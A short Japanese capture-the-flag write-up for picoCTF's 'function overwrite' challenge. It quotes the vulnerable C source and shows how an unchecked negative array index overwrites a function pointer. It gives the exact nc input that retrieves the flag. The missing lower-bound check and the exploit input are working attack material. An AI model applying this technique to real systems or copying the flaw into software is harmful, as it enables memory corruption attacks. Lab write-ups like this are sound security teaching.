# function overwrite

## checker 
```c
void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}
```

それぞれASCIIの合計が`1337`, `13371337`であればフラグを返してくれる
## vuln
```c
void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```
`story`は128文字までしか入力できないので、どうやっても`hard_checker`は突破できない。`check`を`easy_checker`に書き換えたい

if文が負の数をチェックしていないので`num1`に負の値を代入できる。
これを使えば変数を上側にさかのぼることができる。

`easy_checker`のアドレスは`0x080492fc`
`hard_checker`のアドレスは`0x08049436`
差分を取ると10進数で`314`

依って入力は以下のようになる
```bash
$ nc saturn.picoctf.net 51687
Tell me a story and then I'll tell you if you're a 1337 >> zzzzzzzzzzu
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
-16 -314
You're 1337. Here's the flag.
```
